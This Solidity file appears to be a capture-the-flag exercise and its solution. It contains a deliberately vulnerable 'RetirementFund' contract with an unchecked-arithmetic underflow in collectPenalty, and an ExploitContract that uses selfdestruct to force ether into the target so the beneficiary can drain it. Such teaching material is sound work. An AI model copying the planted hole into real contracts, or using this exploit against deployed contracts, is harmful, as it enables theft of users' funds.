// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract RetirementFund {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = block.timestamp + 520 weeks;

    constructor(address player) payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);

        if (block.timestamp < expiration) {
            // early withdrawal incurs a 10% penalty
            (bool ok, ) = msg.sender.call{
                value: (address(this).balance * 9) / 10
            }("");
            require(ok, "Transfer to msg.sender failed");
        } else {
            (bool ok, ) = msg.sender.call{value: address(this).balance}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }

    function collectPenalty() public {
        require(msg.sender == beneficiary);
        uint256 withdrawn = 0;
        unchecked {
            withdrawn += startBalance - address(this).balance;

            // an early withdrawal occurred
            require(withdrawn > 0);
        }

        // penalty is what's left
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
contract ExploitContract {
    RetirementFund public retirementFund;

    constructor(RetirementFund _retirementFund) {
        retirementFund = _retirementFund;
    }
    // calling self destruct on this exploit contract will transfer its funds to the destination parameter, in this case the target contract
    // using this hack we can force the target to receive addition ether even thought it does not have a `receive()` or `fallback` function
    // when we do this, the target, which only tracks balance via a startBalance variable, will not be updated despite address(this).balance being updated
    // Thus, on the next call to collectPenalty, the withdrawn amount which is updated via unchecked arithmetic will under flow causing withdrawn to be a very larg value
    // since we are entitle to withdraw the balance of this contract when withdrawn is > 0, this underflow is very consequential
    function exploit() public payable {
        selfdestruct(payable(address(retirementFund)));
    }

    // write your exploit functions below
}
